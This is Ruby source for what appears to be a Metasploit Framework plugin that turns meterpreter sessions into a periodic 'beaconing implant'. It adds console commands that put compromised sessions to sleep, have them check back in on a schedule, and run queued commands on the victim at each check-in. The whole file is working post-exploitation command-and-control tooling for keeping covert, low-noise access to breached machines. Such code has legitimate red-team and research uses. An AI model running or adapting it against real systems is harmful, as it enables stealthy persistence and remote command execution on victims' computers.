module Msf
class Plugin::Beacon < Msf::Plugin

  def name
    'beacon'
  end

  def desc
    "Makes meterpreter a ghetto beaconing implant"
  end

  def initialize(framework, opts)
    super
    @inst = add_console_dispatcher(BeaconCommandDispatcher)
  end

  def cleanup
    remove_console_dispatcher('beacon')
    self.framework.events.remove_session_subscriber(@inst)
  end

  class BeaconCommandDispatcher
    include Msf::SessionEvent
    include Msf::Ui::Console::CommandDispatcher

    def initialize(console_driver)
      super
      @beacons = {}
      @commands = {}
      self.framework.events.add_session_subscriber(self)
    end

    def commands
      {
        'beacon_start' => "Start Beaconing - beacon_start [UUID|SESSION] PERIOD",
        'beacon_stop' => "Stop Beaconing - beacon_stop [UUID|SESSION]",
        'beacon_commands' => "Run commands on next checkin - beacon_cmd [UUID|SESSION] \"CMD\"",
      }
    end

    def on_session_open(session)
      return unless session.type == 'meterpreter'
      uuid = Rex::Text.to_hex(session.core.uuid.puid, "")
      if @beacons[uuid]
        Thread.new do
          # We run in a new thread to let the other session handlers
          # have a chance to initialize the UI and load stdapi etc.
          #session.init_ui(self.driver.input, self.driver.output)
          Rex.sleep 10
          if @commands[uuid]
            cmds = @commands[uuid]
            print_status "Running #{cmds.length} commands on #{uuid}"
            begin
              cmds.each do |cmd|
                print_status("Running '#{cmd}' on #{uuid}")
                session.run_cmd cmd
              end
            rescue Exception => e
              print_error("Error running #{cmd} - #{e}")
            end
            @commands[uuid] = nil
          end

          print_status "Sleeping #{uuid} #{@beacons[uuid]}s"
          session.core.transport_sleep @beacons[uuid]
          session.kill
        end
      end
    end

    def arg_to_uuid(arg)
      if arg =~ /\A[-+]?[0-9]+\z/
        session = framework.sessions[arg.to_i]
        if session
          uuid = Rex::Text.to_hex(framework.sessions[arg.to_i].core.uuid.puid, "")
        else
          print_error "Session #{arg} does not exist"
          uuid = nil
        end
      else
        uuid = arg
      end

      uuid
    end

    def cmd_beacon_start(*args)
      if args.length == 2
        # TODO Check args
        uuid = arg_to_uuid(args.shift)
        return unless uuid

        period = args.shift.to_i
        if period < 30
          print_error("Minimum sleep time 30s")
          return
        end

        print_status "Beaconing #{uuid} every #{period}s"
        @beacons[uuid] = period
        framework.sessions.each do |s|
          if Rex::Text.to_hex(s.last.core.uuid.puid, "") == uuid
            s.last.core.transport_sleep(period)
            sleep 5
            s.last.kill
          end
        end
      else
        print_error("Usage: beacon_start UUID PERIOD")
      end
    end

    def cmd_beacon_stop(*args)
      if args.length == 1
        uuid = args.shift
        print_status("Stopping #{uuid} beaconing")
        @beacons[uuid] = nil
        @commands[uuid] = nil
      else
        print_error("Usage: beacon_stop UUID")
      end
    end

    def cmd_beacon_commands(*args)
      if args.length > 1
        uuid = args.shift
        @commands[uuid] = args
        print_status "Queueing #{args.length} commands on #{uuid}"
      else
        print_error("Usage: beacon_commands UUID *CMDS")
      end
    end

    def name
      'beacon'
    end
  end
end
end
